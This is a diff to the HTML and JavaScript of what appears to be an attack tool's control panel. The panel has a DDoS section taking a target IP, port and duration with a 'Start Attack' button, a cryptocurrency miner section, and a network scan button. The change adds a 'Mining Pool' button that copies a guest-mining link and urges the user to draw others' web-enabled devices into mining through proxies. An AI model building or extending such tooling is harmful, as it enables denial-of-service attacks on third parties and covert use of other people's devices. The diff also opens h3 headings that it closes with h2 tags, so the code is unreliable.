@@ -211,13 +211,13 @@
       </div>
     </div>
     <div class="panel" id="networkPanel">
-      <h2>🌐│𝗻𝗲𝘁𝘄𝗼𝗿𝗸</h2>
+      <h3>🌐│𝗻𝗲𝘁𝘄𝗼𝗿𝗸</h2>
       <input type="text" id="networkNameInput" placeholder="Network Name">
       <input type="text" id="passwordInput" placeholder="Password (Optional)">
       <button id="saveNetworkButton">Save</button>
     </div>
     <div class="panel" id="ddosPanel">
-      <h2>🛰️│𝗱𝗱𝗼𝘀</h2>
+      <h3>🛰️│𝗱𝗱𝗼𝘀</h2>
       <input type="text" id="ipInput" placeholder="IP">
       <input type="text" id="portInput" placeholder="Port">
       <input type="text" id="secondsInput" placeholder="Time">
@@ -230,15 +230,18 @@
       <button id="bootButton">Start Attack</button>
     </div>
     <div class="panel" id="cryptoMinerPanel">
-      <h2>⛏️│𝗰𝗿𝘆𝗽𝘁𝗼 𝗺𝗶𝗻𝗲𝗿</h2>
+      <h3>⛏️│𝗰𝗿𝘆𝗽𝘁𝗼 𝗺𝗶𝗻𝗲𝗿</h2>
       <div class="button-group">
           <input type="text" id="currencySelectionTextBox" class="textbox" readonly value="Choose Crypto To Start Miner:">
           <button id="btcButton">BTC</button>
           <button id="ethButton">ETH</button>
           <button id="xmrButton">XMR</button>
       </div>
-      <button id="networkScanButton">Network Scan</button>
-  </div>
+      <div class="button-group">
+          <button id="networkScanButton">Network Scan</button>
+          <button id="poolButton">+ Mining Pool</button>
+      </div>
+    </div>
   </div>
 
   <script>
@@ -333,6 +336,20 @@
                 document.getElementById('portInput').value = '';
                 document.getElementById('secondsInput').value = '';
             });
+
+            document.getElementById('poolButton').addEventListener('click', function() {
+              // Display the message
+              alert('Invite users with any web enabled device. Share the copied link for them to log in as a guest and join the mining pool via proxies.');
+
+              // Copy the link to the clipboard
+              const link = 'https://tornetmarket.github.io/TornetMarket-/guestmine.html';
+              navigator.clipboard.writeText(link).then(() => {
+                  console.log('Link copied to clipboard: ' + link);
+              }).catch(err => {
+                  console.error('Failed to copy the link: ', err);
+              });
+            });
+
 
             
             document.getElementById('btcButton').addEventListener('click', async function() {
